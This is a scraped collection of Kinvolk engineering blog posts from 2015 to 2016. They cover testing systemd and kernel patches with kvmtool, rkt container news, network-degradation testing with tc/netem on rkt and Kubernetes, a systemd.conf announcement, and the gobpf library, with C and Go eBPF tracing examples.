{"website": "Kinvolk", "title": "Testing systemd Patches", "author": ["\n  By\n  \n  \n  \n  \n    \n    \n      Alban Crequy\n    \n    \n    \n  \n  \n    ", "\n  \n"], "link": "https://kinvolk.io/blog/2015/12/testing-systemd-patches/", "abstract": "It’s not so easy to test new patches for systemd. Because systemd is the first process started on boot, the traditional way to test was to install the new version on your own computer and reboot. However, this approach is not practical because it makes the development cycle quite long: after writing a few lines of code, I don’t want to close all my applications and reboot. There is also a risk that my patch contains some bugs and if I install systemd on my development computer, it won’t boot. It would then take even more time to fix it. All of this probably just to test a few lines of code. This is of course not a new problem and systemd-nspawn was at first implemented in 2011 as a simple tool to test systemd in an isolated environment. During the years, systemd-nspawn grew in features and became more than a testing tool. Today, it is integrated with other components of the systemd project such as machinectl and it can pull container images or VM images, start them as systemd units. systemd-nspawn is also used as an internal component of the app container runtime, rkt . When developing rkt, I often need to test patches in systemd-nspawn or other components of the systemd project like systemd-machined. And since systemd-nspawn uses recent features of the Linux kernel that are still being developed (cgroups, user namespaces, etc.), I also sometimes need to test a different kernel or a different machined. In this case, testing with systemd-nspawn does not help because I would still use the kernel installed on my computer and systemd-machined installed on my computer. I still don’t want to reboot nor do I want to install a non-stable kernel or non-stable systemd patches on my development computer. So today I am explaining how I am testing new kernels and new systemd with kvmtool and debootstrap. Getting kvmtool Why kvmtool? I want to be able to install systemd in my test environment easily with just a “make install”. I don’t want to have to prepare a testing image for each test but instead just use the same filesystem. $ cd ~/git\n$ git clone https://kernel.googlesource.com/pub/scm/linux/kernel/git/will/kvmtool\n$ cd kvmtool && make Compiling a kernel The kernel is compiled as usual but with the options listed in kvmtool’s README file (here’s the .config file I use).\nI just keep around the different versions of the kernels I want to test: $ cd ~/git/linux\n$ ls bzImage*\nbzImage      bzImage-4.3         bzImage-cgroupns.v5  bzImage-v4.1-rc1-2-g1b852bc\nbzImage-4.1  bzImage-4.3.0-rc4+  bzImage-v4.1-rc1     bzImage-v4.3-rc4-15-gf670268 Getting the filesystem for the test environment The man page of systemd-nspawn explains how to install a minimal Fedora, Debian or Arch distribution in a directory with the dnf , debootstrap or pacstrap commands respectively. sudo dnf -y --releasever=22 --nogpg --installroot=${HOME}/distro-trees/fedora-22 --disablerepo='*' --enablerepo=fedora install systemd passwd dnf fedora-release vim-minimal Set the root password of your fedora 22 the first time, and then you are ready to boot it: sudo systemd-nspawn -D ${HOME}/distro-trees/fedora-22 passwd I don’t have to actually boot it with kvmtool to update the system. systemd-nspawn is enough: sudo systemd-nspawn -D ${HOME}/distro-trees/fedora-22 dnf update Installing systemd $ cd ~/git/systemd\n$ ./autogen.sh\n$ ./configure CFLAGS='-g -O0 -ftrapv' --enable-compat-libs --enable-kdbus --sysconfdir=/etc --localstatedir=/var --libdir=/usr/lib64\n$ make\n$ sudo DESTDIR=$HOME/distro-trees/fedora-22 make install\n$ sudo DESTDIR=$HOME/distro-trees/fedora-22/fedora-tree make install As you notice, I am installing systemd both in ~/distro-trees/fedora-22 and ~/distro-trees/fedora-22/fedora-tree . The first one is for the VM started by kvmtool , and the second is for the container started by systemd-nspawn inside the VM. Running a test I can easily test my systemd patches quickly with various versions of the kernel and various Linux distributions. I can also start systemd-nspawn inside lkvm if I want to test the interaction between systemd, systemd-machined and systemd-nspawn. All of this, without rebooting or installing any unstable software on my main computer. I am sourcing the following in my shell: test_kvm () { distro = $1 kernelver = $2 kernelparams = $3 kernelimg = ${ HOME } /git/linux/bzImage- ${ kernelver } distrodir = ${ HOME } /distro-trees/ ${ distro } if [ ! -f $kernelimg -o ! -d $distrodir ] ; then echo \"Usage: test_kvm distro kernelver kernelparams\" echo \"       test_kvm f22 4.3 systemd.unified_cgroup_hierarchy=1\" return 1 fi sudo ${ HOME } /git/kvmtool/lkvm run --name ${ distro } - ${ kernelver } \\ --kernel ${ kernelimg } \\ --disk ${ distrodir } \\ --mem 2048 \\ --network virtio \\ --params = \" ${ kernelparams } \" } Then, I can just test rkt or systemd-nspawn with the unified cgroup hierarchy: $ test_kvm fedora-22 4.3 systemd.unified_cgroup_hierarchy=1 Conclusion With this setup, I could test cgroup namespaces in systemd-nspawn with the kernel patches that are being reviewed upstream and my systemd patches without rebooting or installing them on my development computer.", "date": "2015-12-10"},
{"website": "Kinvolk", "title": "FOSDEM 2016 Wrap-up: Bowling with Containers", "author": ["\n  By\n  \n  \n  \n  \n    \n    \n      Chris Kühl\n    \n    \n    \n  \n  \n    ", "\n  \n"], "link": "https://kinvolk.io/blog/2016/01/fosdem-2016-wrap-up-bowling-with-containers/", "abstract": "Another year, another trip to FOSDEM , arguably the best free & open source software event in the world, but definitely the best in Europe. FOSDEM offers an amazingly broad range of talks which is only surpassed by the richness of its hallway track… and maybe the legendary beer event . ;) This year our focus was to talk to folks about rkt , the container runtime we work on with CoreOS , and meet more people from the container development community, along with the usual catching up with old friends. At #FOSDEM ? Don't miss @baronboulle and Alban Crequy's talk, container mechanics in rkt & Linux, at 16:45 today https://t.co/F9BcwFhgkQ — CoreOS, Inc. (@coreos) January 30, 2016 On Saturday, Alban gave a talk with CoreOS’ Jon Boulle entitled “ Container mechanics in rkt and Linux ”, where Jon presented a general overview of the rkt project and Alban followed with a deep dive into how containers work on Linux, and in rkt specifically. The talk was very well attended. If you weren’t able to attend however, you can find the slides here . For Saturday evening, we had organized a bowling event for some of the people involved in rkt, and containers on Linux in general. A majority of the people attending we’d not yet meet IRL. We finally got a chance to meet the team from Intel Poland who has been working on rkt’s LKVM stage1 , the BlaBlaCar team—brave early adopters of rkt—as well as some folks from NTT and Virtuozzo . There were also a few folks we see quite often from Red Hat , Giant Swarm and of course the team from CoreOS. As it turns out, the best bowler was the aforementioned Jon Boulle, who bowled a very respectable score of 120. Having taken the FOSDEM pilgrimage about 20 times collectively now, the Kinvolk team are veterans of the event. However, each year brings new, exciting topics of discussion. These are mostly shaped by one’s own interests (containers and SDN for us) but also by new trends within the community. We’re already excited to see what next year will bring. We hope to see you there!", "date": "2016-01-02"},
{"website": "Kinvolk", "title": "Welcome rkt 1.0!", "author": ["\n  By\n  \n  \n  \n  \n    \n    \n      Chris Kühl\n    \n    \n    \n  \n  \n    ", "\n  \n"], "link": "https://kinvolk.io/blog/2016/02/welcome-rkt-1.0/", "abstract": "About 14 months ago, CoreOS announced their intention to build a new container runtime based on the App Container Specification , introduced at the same time. Over these past 14 months, the rkt team has worked to make rkt viable for production use and get to a point where we could offer certain stability guarantees. With today’s release of rkt 1.0 , the rkt team believes we have reached that point. We’d like to congratulate CoreOS on making it to this milestone and look forward to seeing rkt mature. With rkt, CoreOS has provided the community with a container runtime with first-class integration on modern Linux systems and a security-first approach. We’d especially like to thank CoreOS for giving us the chance to be involved with rkt. Over the past months we’ve had the pleasure to make substantial contributions to rkt. Now that the 1.0 release is out, we look forward to continuing that, with even greater input from and collaboration with the community. At Kinvolk, we want to push Linux forward by contributing to projects that are at the core of modern Linux systems. We believe that rkt is one of these technologies. We are especially happy that we could work to make the integration with systemd as seamless as possible. There’s still work on this front to do but we’re happy with where we’ve gotten so far. rkt is so important because it fills a hole that was left by other container runtimes. It lets the operating system do what it does best, manage processes. We believe whole-heartedly when Lennart , creator and lead developer of the systemd project, states… Over the next few weeks, we’ll be posting a series of blog stories related to rkt. Follow Kinvolk on twitter to get notified when they go live and follow the story.", "date": "2016-02-04"},
{"website": "Kinvolk", "title": "Testing Degraded Network Scenarios with rkt", "author": ["\n  By\n  \n  \n  \n  \n    \n    \n      Alban Crequy\n    \n    \n    \n  \n  \n    ", "\n  \n"], "link": "https://kinvolk.io/blog/2016/02/testing-degraded-network-scenarios-with-rkt/", "abstract": "The current state of testing Testing applications is important. Some even go as far as saying, “If it isn’t tested, it doesn’t work”. While that may have both a degree of truth and untruth to it, the rise of continuous integration (CI) and automated testing have shown that the software industry is taking testing seriously. However, there is at least one area of testing that is difficult to automate and, thus, hasn’t been adequately incorporated into testing scenarios: poor network connectivity. The typical testing process has the developer as the first line of defence. Developers usually work within reliable networking conditions. The developers then submit their code to a CI system which also runs tests under good networking conditions. Once the CI system goes green, internal testing is usually done; ship it! Nowhere in this process were scenarios tested where your application experiences degraded network conditions. If your internal tests don’t cover these scenarios then it’s your users who’ll be doing the testing. This is far from an ideal situation and goes against the “test early test often” mantra of CI; a bug will cost you more the later it’s caught. Three examples To make this more concrete, let’s look at a few examples where users might notice issues that you, or your testing infrastructure, may not: A web shop you click on “buy”, it redirects to a new page but freezes because of a connection issue. The user does not get feedback whether the javascript code will try again automatically; the user does not know whether she should refresh. That’s a bug. Once fixed, how do you test it? You need to break the connection just before the test script clicks on the “buy” link. A video stream server The Real-Time Protocol (RTP) uses UDP packets. If some packets drop or arrive too late, it’s not a big deal; the video player will display a degraded video because of the missing packets but the stream will otherwise play just fine. Or, will it? So how can the developers of a video stream server test a scenario where 3% of packets are dropped or delayed? Applications like etcd or zookeeper implement a consensus protocol . They should be designed to handle a node disconnecting from the network and network splits. See the approach CoreOS takes for an example. It doesn’t take much imagination to come up with more, but these should be enough to make the point. Where Linux can help What functionality does the Linux kernel provide to enable us to test these scenarios? Linux provides a means to shape both the egress traffic (emitted by a network interface) and to some extend the ingress traffic (received by a network interface). This is done by way of qdiscs, short for queuing disciplines. In essence, a qdisc is a packet scheduler. Using different qdiscs we can change the way packets are scheduled. qdiscs can have associated classes and filters. These all combine to let us delay, drop, or rate-limit packets, among a host of other things. A complete description is out of the scope of this blog post. For our purposes, we’ll just look at one qdisc called “ netem ”, short for network emulation. This will allow us to tweak the packet scheduling characteristics we want. What about containers? Up to this point we haven’t even mentioned containers. That’s because the story is the same with regards to traffic control whether we’re talking about bare-metal servers, VMs or containers. Containers reside in their own network namespace, providing the container with a completely isolated network. Thus, the traffic between containers, or between a container and the host, can all be shaped in the same way. Testing the idea As a demonstration I’ve created a simple demo that starts an RTP server in a container using rkt . In order to easily tweak network parameters, I’ve hacked up a GUI written in Gtk/Javascript. And finally, to see the results we just need to point a video player to our RTP server. We’ll step through the demo below. But if you want to play along at home, you can find the code in the kinvolk/demo repo on Github Running the demo First, I start the video streaming server in a rkt pod. The server streams the Elephant Dreams movie to a media player via the RTP/RTSP protocol. RTSP uses a TCP connection to send commands to the server. Examples of commands are choosing the file to play or seeking to a point in the middle of the stream. RTP it what actually sends the video via UDP packets. Second, we start the GUI to dynamically change some parameters of the network emulator. What this does is connect to the rkt network namespace and change the egress qdisc using Linux’s tc command. Now we can adjust the values as we like. For example, when I add 5% packet loss, the quality is degraded but not interrupted. When I remove the packet loss, the video becomes clear again. When I add 10s latency in the network, the video freezes. Play the video to see this in action. What this shows us is that traffic control can be used effectively with containers to test applications - in this case a media server. Next steps The drawback to this approach is that it’s still manual. For automated testing we don’t want a GUI. Rather, we need a means of scripting various scenarios. In rkt we use CNI network plugins to configure the network. Interestingly, several plugins can be used together to defines several network interfaces. What I’d like to see is a plugin added that allows one to configure traffic control in the network namespace of the container. In order to integrate this into testing frameworks, the traffic control parameters should be dynamically adjustable, allowing for the scriptability mentioned above. Stay tuned… In a coming blog post, we’ll show that this is not only interesting when using rkt as an isolated component. It’s more interesting when tested in a container orchestration system like Kubernetes . Follow Kinvolk on twitter to get notified when new blog posts go live.", "date": "2016-02-12"},
{"website": "Kinvolk", "title": "Testing web services with traffic control on Kubernetes", "author": ["\n  By\n  \n  \n  \n  \n    \n    \n      alessandro-puccetti\n    \n    \n    \n  \n  \n    ", "\n  \n"], "link": "https://kinvolk.io/blog/2016/05/testing-web-services-with-traffic-control-on-kubernetes/", "abstract": "This is part 2 of our “testing applications with traffic control series”. See part 1, testing degraded network scenarios with rkt , for detailed information about how traffic control works on Linux. In this installment we demonstrate how to test web services with traffic control on Kubernetes . We introduce tcd , a simple traffic control daemon developed by Kinvolk for this demo. Our demonstration system runs on Openshift 3 , Red Hat’s Container Platform based on Kubernetes, and uses the excellent Weave Scope , an interactive container monitoring and visualization tool. We’ll be giving a live demonstration of this at the OpenShift Commons Briefing on May 26th, 2016. Please join us there. The premise As discussed in part 1 of this series, tests generally run under optimal networking conditions. This means that standard testing procedures neglect a whole bevy of issues that can arise due to poor network conditions. Would it not be prudent to also test that your services perform satisfactorily when there is, for example, high packet loss, high latency, a slow rate of transmission, or a combination of those? We think so, and if you do too, please read on. Traffic control on a distributed system Let’s now make things more concrete by using tcd in our Kubernetes cluster. The setup To get started, we need to start an OpenShift ready VM to provide us our Kubernetes cluster. We’ll then create an OpenShift project and do some configuration. If you want to follow along, you can go to our demo repository which will guide you through installing and setting up things.\nThe pieces\nBefore diving into the traffic control demo, we want to give you a really quick overview of tcd, OpenShift and Weave Scope. tcd (traffic control daemon) tcd is a simple daemon that runs on each Kubernetes node and responds to API calls. tcd manipulates the traffic control settings of the pods using the tc command which we briefly mentioned in part 1. It’s decoupled from the service being tested, meaning you can stop and restart the daemon on a pod without affecting its connectivity. In this demo, it receives commands from buttons exposed in Weave Scope. OpenShift OpenShift is Red Hat’s container platform that makes it simple to build, deploy, manage and secure containerized applications at scale on any cloud infrastructure, including Red Hat’s own hosted offering, OpenShift Dedicated . Version 3 of OpenShift uses Kubernetes under the hood to maintain cluster health and easily scale services. In the following figure, you see an example of the OpenShift dashboard with the running pods. Here we have 1 Weave Scope App pod, 3 ping test pods, 1 tcd pod, and one Weave Scope App. Using the arrow buttons one can scale the application up and down and the circle changes color depending on the status of the application (e.g. scaling, terminating, etc.). Weave Scope Weave Scope helps to intuitively understand, monitor, and control containerized applications. It visually represents pods and processes running on Kubernetes and allows one to drill into pods, showing information such as CPU & memory usage, running processes, etc. One can also stop, start, and interact with containerized applications directly through its UI. While this graphic shows Weave Scope displaying containers, we see at the top that we can also display information about processes and hosts. How the pieces fit together Now that we understand the individual pieces, let’s see how it all works together. Below is a diagram of our demo system. Here we have 2 Kubernetes nodes each running one instance of the tcd daemon. tcd can only manage the traffic control settings of pods local to the Kubernetes node on which it’s running, thus the need for one per node. On the right we see the Weave Scope app showing details for the selected pod; in this case, the one being pointed to by (4). In the red oval, we see the three buttons we’ve added to Scope app for this demo. These set the network connectivity parameters of the selected pod’s egress traffic to a latency of 2000ms, 300ms, 1ms, respectively, from left to right. When clicked (1), the scope app sends a message (2) to the Weave Scope probe running on the selected pod’s Kubernetes node. The Weave Scope probe sends a gRPC message (3) to the tcd daemon, in this case a ConfigureEgressMethod message, running on its Kubernetes node telling it to configure the pods egress traffic (4) accordingly. While this demo only configures the latency, tcd can also be used to configure the bandwidth and the percentage of packet drop. As we saw in part 1, those parameters are features directly provided by the Linux netem queuing discipline . Being able to dynamically change the network characteristics for each pod, we can observe the behaviour of services during transitions as well as in steady state. Of course, by observe we mean test ,which we’ll turn to now. Testing with traffic control Now for 2 short demos to show how traffic control can be used for testing. Ping test This is a contrived demo to show that the setup works and we can, in fact, manipulate the egress traffic characteristics of a pod. The following video shows a pod downloading a small file from Internet with the wget command, with the target host being the one for which we are adjusting the packet latency. It should be easy to see the affects that adjusting the latency has; with greater latency it takes longer to get a reply. Guestbook app test We use the Kubernetes guestbook example for our next, more real-world, demo. Some small modifications have been made to provide user-feedback when the reply from the web server takes a long time, showing a “loading…” message. Generally, this type of thing goes untested because, as we mentioned in the introduction, our tests run under favorable networking conditions. Tools like Selenium and agouti allow for testing web applications in an automated way without manually interacting with a browser. For this demo we’ll be using agouti with its Chrome backend so that we can see the test run. In the following video we see this feature being automatically tested by a Go script using the Ginkgo testing framework and Gomega matcher library . In this demo, testers still need to configure the traffic control latency manually by clicking on the Weave Scope app buttons before running the test. However, since tcd can accept commands over gRPC, the Go script could easily connect to tcd to perform that configuration automatically, and dynamically, at run time. We’ll leave that as an exercise for the reader. :) Conclusion With Kubernetes becoming a defacto building block of modern container platforms, we now have a basis on which to start integrating features in a standardized way that have long gone ignored. We think traffic control for testing, and other creative endeavors, is a good example of this. If you’re interested in moving this forward, we encourage you to take what we’ve started and run with it. And whether you just want to talk to us about this or you need professional support in your efforts, we’d be happy to talk to you. Thanks to… We’d like to thank Ilya & Tom from Weaveworks and Jorge & Ryan from Red Hat for helping us with some technical issues we ran into while setting up this demo. And a special thanks to Diane from the OpenShift project for helping coordinate the effort.", "date": "2016-05-23"},
{"website": "Kinvolk", "title": "Introducing systemd.conf 2016", "author": ["\n  By\n  \n  \n  \n  \n    \n    \n      Chris Kühl\n    \n    \n    \n  \n  \n    ", "\n  \n"], "link": "https://kinvolk.io/blog/2016/04/introducing-systemd.conf-2016/", "abstract": "The systemd project will be having its 2nd conference— systemd.conf —from Sept. 28th to Oct. 1st, once again at betahaus in Berlin. After the success of last year’s conference, we’re looking forward to having much of the systemd community in Berlin for a second consecutive year. As this year’s event takes place just before LinuxCon Europe , we’re expecting some new faces. Kinvolk’s involvement As an active user and contributor to systemd, currently through our work on rkt , we’re interested in promoting systemd and helping provide a place for the systemd community to gather. Last year, Kinvolk helped with much of the organization. This year, we’re happy to be expanding our involvement to include handling the financial-side of the event. In general, Kinvolk is willing to help provide support to open source projects who want to hold events in Berlin. Just send us a mail to [email protected] . Don’t fix what isn’t broken As feedback from last year’s post–conference survey showed, most attendees were pleased with the format. Thus, this year very little will change. The biggest difference is that we’re adding another room to accommodate a few more people and to facilitate impromptu breakout sessions. Some other small changes are that we’ll have warm lunches instead of sandwiches and we’ve dropped the speakers dinner as we felt it wasn’t in line with the goal of bringing all attendees together. Workshop day A new addition to systemd.conf, is the workshop day. The audience for systemd.conf 2015 was predominantly systemd contributors and proficient users. This was very much expected and intended. However, we also want to give people of varying familiarity with the systemd project the chance to learn more from the people who know it best. The workshop day is intended to facilitate this. The call for presentations (CfP) will include a call for workshop sessions. These workshop sessions will be 2 to 3-hour hands-on sessions covering various areas of, or related to, the systemd project. You can consider it a day of systemd training if that helps with getting approval to attend. :) As we expect a different audience for workshops than for the presentation and hackfest days, we will be issuing separate tickets. Tickets will become available once the call for participation opens. Get involved! There are several ways you can help make systemd.conf 2016 a success. Become a sponsor These events are only possible with the support of sponsors. In addition to helping the event be more awesome, your sponsorship allows us to bring more of the community together by sponsoring the attendance of those community member that need financial assistance to attend. See the systemd.conf 2016 website for how to become a sponsor. Submitting talk and workshop proposals systemd.conf is only as good as the people who attend and the content they provide. In a few weeks we’ll be announcing the opening of the CfP. If you, or your organization, is doing interesting things with systemd, we encourage you to submit a proposal. If you want to spread your knowledge of systemd with others, please consider submitting a proposal for a workshop session. We’re excited about what this year’s event will bring and look forward to seeing you at systemd.conf 2016!", "date": "2016-04-22"},
{"website": "Kinvolk", "title": "Introducing gobpf - Using eBPF from Go", "author": ["\n  By\n  \n  \n  \n  \n    \n    \n      Michael Schubert\n    \n    \n    \n  \n  \n    ", "\n  \n"], "link": "https://kinvolk.io/blog/2016/11/introducing-gobpf-using-ebpf-from-go/", "abstract": "What is eBPF? eBPF is a “bytecode virtual machine” in the Linux kernel that is used for\ntracing kernel functions, networking, performance analysis and more. Its roots\nlay in the Berkeley Packet Filter (sometimes called LSF, Linux Socket Filtering), but as it supports more\noperations (e.g. BPF_CALL  0x80  /* eBPF only: function call */ ) and nowadays\nhas much broader use than packet filtering on a socket, it’s called extended\nBPF. With the addition of the dedicated bpf() syscall in Linux 3.18, it became\neasier to perform the various eBPF operations. Further, the BPF\ncompiler collection from the IO Visor Project and its libbpf\nprovide a rich set of helper functions as well as Python bindings that make it\nmore convenient to write eBPF powered tools. To get an idea of how eBPF looks, let’s take a peek at struct bpf_insn prog[] a list of instructions in pseudo-assembly. Below we have a simple user-space\nC program to count the number of fchownat(2) calls. We use bpf_prog_load from libbpf to load the eBPF instructions as a kprobe and use bpf_attach_kprobe to attach it to the syscall. Now each time fchownat is\ncalled, the kernel executes the eBPF program. The program loads the map (more\nabout maps later), increments the counter and exits. In the C program, we read\nthe value from the map and print it every second. #include <errno.h> #include <stdio.h> #include <string.h> #include <unistd.h> #include <linux/version.h> #include <bcc/bpf_common.h> #include <bcc/libbpf.h> int main () { int map_fd, prog_fd, key = 0 , ret; long long value; char log_buf[ 8192 ]; void * kprobe; /* Map size is 1 since we store only one value, the chown count */ map_fd = bpf_create_map(BPF_MAP_TYPE_HASH, sizeof (key), sizeof (value), 1 ); if (map_fd < 0 ) {\n\t\tfprintf(stderr, \"failed to create map: %s (ret %d) \\n \" , strerror(errno), map_fd); return 1 ;\n\t}\n\n\tret = bpf_update_elem(map_fd, & key, & value, 0 ); if (ret != 0 ) {\n\t\tfprintf(stderr, \"failed to initialize map: %s (ret %d) \\n \" , strerror(errno), ret); return 1 ;\n\t} struct bpf_insn prog[] = { /* Put 0 (the map key) on the stack */ BPF_ST_MEM(BPF_W, BPF_REG_10, - 4 , 0 ), /* Put frame pointer into R2 */ BPF_MOV64_REG(BPF_REG_2, BPF_REG_10), /* Decrement pointer by four */ BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, - 4 ), /* Put map_fd into R1 */ BPF_LD_MAP_FD(BPF_REG_1, map_fd), /* Load current count from map into R0 */ BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0 , 0 , 0 ,\n\t\t\t     BPF_FUNC_map_lookup_elem), /* If returned value NULL, skip two instructions and return */ BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, 0 , 2 ), /* Put 1 into R1 */ BPF_MOV64_IMM(BPF_REG_1, 1 ), /* Increment value by 1 */ BPF_RAW_INSN(BPF_STX | BPF_XADD | BPF_DW, BPF_REG_0, BPF_REG_1, 0 , 0 ), /* Return from program */ BPF_EXIT_INSN(),\n\t};\n\n\tprog_fd = bpf_prog_load(BPF_PROG_TYPE_KPROBE, prog, sizeof (prog), \"GPL\" , LINUX_VERSION_CODE, log_buf, sizeof (log_buf)); if (prog_fd < 0 ) {\n\t\tfprintf(stderr, \"failed to load prog: %s (ret %d) \\n got CAP_SYS_ADMIN? \\n %s \\n \" , strerror(errno), prog_fd, log_buf); return 1 ;\n\t}\n\n\tkprobe = bpf_attach_kprobe(prog_fd, \"p_sys_fchownat\" , \"p:kprobes/p_sys_fchownat sys_fchownat\" , - 1 , 0 , - 1 , NULL , NULL ); if (kprobe == NULL ) {\n\t\tfprintf(stderr, \"failed to attach kprobe: %s \\n \" , strerror(errno)); return 1 ;\n\t} for (;;) {\n\t\tret = bpf_lookup_elem(map_fd, & key, & value); if (ret != 0 ) {\n\t\t\tfprintf(stderr, \"failed to lookup element: %s (ret %d) \\n \" , strerror(errno), ret);\n\t\t} else {\n\t\t\tprintf( \"fchownat(2) count: %lld \\n \" , value);\n\t\t}\n\t\tsleep( 1 );\n\t} return 0 ;\n} The example requires libbcc and can be compiled with: gcc -I/usr/include/bcc/compat main.c -o chowncount -lbcc Nota bene : the increment in the example code is not atomic. In real code, we\nwould have to use one map per CPU and aggregate the result. It is important to know that eBPF programs run directly in the kernel and that\ntheir invocation depends on the type. They are executed without change of\ncontext. As we have seen above, kprobes for example are triggered whenever the kernel executes a\nspecified function. Thanks to clang and LLVM , it’s\nnot necessary to actually write plain eBPF instructions. Modules can be\nwritten in C and use functions provided by libbpf (as we will see in the gobpf\nexample below). eBPF Program Types The type of an eBPF program defines properties like the kernel helper functions\navailable to the program or the input it receives from the kernel. Linux 4.8\nknows the following program types: // https://github.com/torvalds/linux/blob/v4.8/include/uapi/linux/bpf.h#L90-L98 enum bpf_prog_type {\n\tBPF_PROG_TYPE_UNSPEC,\n\tBPF_PROG_TYPE_SOCKET_FILTER,\n\tBPF_PROG_TYPE_KPROBE,\n\tBPF_PROG_TYPE_SCHED_CLS,\n\tBPF_PROG_TYPE_SCHED_ACT,\n\tBPF_PROG_TYPE_TRACEPOINT,\n\tBPF_PROG_TYPE_XDP,\n}; A program of type BPF_PROG_TYPE_SOCKET_FILTER , for instance, receives a struct __sk_buff * as its first argument whereas it’s struct pt_regs * for programs of type BPF_PROG_TYPE_KPROBE . eBPF Maps Maps are a “generic data structure for storage of different types of data” and\ncan be used to share data between eBPF programs as well as between kernel and\nuserspace. The key and value of a map can be of arbitrary size as defined when\ncreating the map. The user also defines the maximum number of entries\n( max_entries ). Linux 4.8 knows the following map types: // https://github.com/torvalds/linux/blob/v4.8/include/uapi/linux/bpf.h#L78-L88 enum bpf_map_type {\n\tBPF_MAP_TYPE_UNSPEC,\n\tBPF_MAP_TYPE_HASH,\n\tBPF_MAP_TYPE_ARRAY,\n\tBPF_MAP_TYPE_PROG_ARRAY,\n\tBPF_MAP_TYPE_PERF_EVENT_ARRAY,\n\tBPF_MAP_TYPE_PERCPU_HASH,\n\tBPF_MAP_TYPE_PERCPU_ARRAY,\n\tBPF_MAP_TYPE_STACK_TRACE,\n\tBPF_MAP_TYPE_CGROUP_ARRAY,\n}; While BPF_MAP_TYPE_HASH and BPF_MAP_TYPE_ARRAY are generic maps for\ndifferent types of data, BPF_MAP_TYPE_PROG_ARRAY is a special purpose array\nmap. It holds file descriptors referring to other eBPF programs and can be used\nby an eBPF program to “replace its own program flow with the one from the\nprogram at the given program array slot”. The BPF_MAP_TYPE_PERF_EVENT_ARRAY map is for storing a data of type struct perf_event in a ring buffer. In the example above we used a map of type hash with a size of 1 to hold the\ncall counter. gobpf In the context of the work we are doing on Weave\nScope for Weaveworks , we have been working extensively with\nboth eBPF and Go. As Scope is written in Go, it makes sense to use eBPF\ndirectly from Go. In looking at how to do this, we stumbled upon some\ncode in the IO\nVisor Project that looked like a good starting point. After talking to the\nfolks at the project, we decided to move this out into a dedicated repository: https://github.com/iovisor/gobpf gobpf is a Go library that leverages the bcc\nproject to make working with eBPF programs from Go simple. To get an idea of how this works, the following example chrootsnoop shows how\nto use a bpf.PerfMap to monitor chroot(2) calls: package main import ( \"bytes\" \"encoding/binary\" \"fmt\" \"os\" \"os/signal\" \"unsafe\" \"github.com/iovisor/gobpf\" ) import \"C\" const source string = ` #include <uapi/linux/ptrace.h> #include <bcc/proto.h> typedef struct { u32 pid; char comm[128]; char filename[128]; } chroot_event_t; BPF_PERF_OUTPUT(chroot_events); int kprobe__sys_chroot(struct pt_regs *ctx, const char *filename) { u64 pid = bpf_get_current_pid_tgid(); chroot_event_t event = { .pid = pid >> 32, }; bpf_get_current_comm(&event.comm, sizeof(event.comm)); bpf_probe_read(&event.filename, sizeof(event.filename), (void *)filename); chroot_events.perf_submit(ctx, &event, sizeof(event)); return 0; } ` type chrootEvent struct {\n\tPid uint32 Comm     [ 128 ] byte Filename [ 128 ] byte } func main () {\n\tm := bpf. NewBpfModule (source, [] string {}) defer m. Close ()\n\n\tchrootKprobe, err := m. LoadKprobe ( \"kprobe__sys_chroot\" ) if err != nil {\n\t\tfmt. Fprintf (os.Stderr, \"Failed to load kprobe__sys_chroot: %s\\n\" , err)\n\t\tos. Exit ( 1 )\n\t}\n\n\terr = m. AttachKprobe ( \"sys_chroot\" , chrootKprobe) if err != nil {\n\t\tfmt. Fprintf (os.Stderr, \"Failed to attach kprobe__sys_chroot: %s\\n\" , err)\n\t\tos. Exit ( 1 )\n\t}\n\n\tchrootEventsTable := bpf. NewBpfTable ( 0 , m)\n\n\tchrootEventsChannel := make ( chan [] byte )\n\n\tchrootPerfMap, err := bpf. InitPerfMap (chrootEventsTable, chrootEventsChannel) if err != nil {\n\t\tfmt. Fprintf (os.Stderr, \"Failed to init perf map: %s\\n\" , err)\n\t\tos. Exit ( 1 )\n\t}\n\n\tsig := make ( chan os.Signal, 1 )\n\tsignal. Notify (sig, os.Interrupt, os.Kill) go func () { var chrootE chrootEvent for {\n\t\t\tdata := <- chrootEventsChannel\n\t\t\terr := binary. Read (bytes. NewBuffer (data), binary.LittleEndian, & chrootE) if err != nil {\n\t\t\t\tfmt. Fprintf (os.Stderr, \"Failed to decode received chroot event data: %s\\n\" , err) continue }\n\t\t\tcomm := ( * C.char)(unsafe. Pointer ( & chrootE.Comm))\n\t\t\tfilename := ( * C.char)(unsafe. Pointer ( & chrootE.Filename))\n\t\t\tfmt. Printf ( \"pid %d %s called chroot(2) on %s\\n\" , chrootE.Pid, C. GoString (comm), C. GoString (filename))\n\t\t}\n\t}()\n\n\tchrootPerfMap. Start () <- sig\n\tchrootPerfMap. Stop ()\n} You will notice that our eBPF program is written in C for this example. The bcc\nproject uses clang to convert the code to eBPF instructions. We don’t have to interact with libbpf directly from our Go code, as gobpf\nimplements a callback and makes sure we receive the data from our eBPF program\nthrough the chrootEventsChannel . To test the example, you can run it with sudo -E go run chrootsnoop.go and\nfor instance execute any systemd unit with RootDirectory statement. A simple chroot ... also works, of course. # hello.service [Unit] Description = hello service [Service] RootDirectory = /tmp/chroot ExecStart = /hello [Install] WantedBy = default.target You should see output like: pid 7857 ( hello ) called chroot ( 2 ) on /tmp/chroot Conclusion With its growing capabilities ,\neBPF has become an indispensable tool for modern Linux system software. gobpf\nhelps you to conveniently use libbpf functionality from Go. gobpf is in a very early stage, but usable. Input and contributions are very much welcome. If you want to learn more about our use of eBPF in software like Weave\nScope , stay tuned and have a look at our\nwork on GitHub: https://github.com/kinvolk Follow Kinvolk on Twitter to get notified when\nnew blog posts go live.", "date": "2016-11-30"},
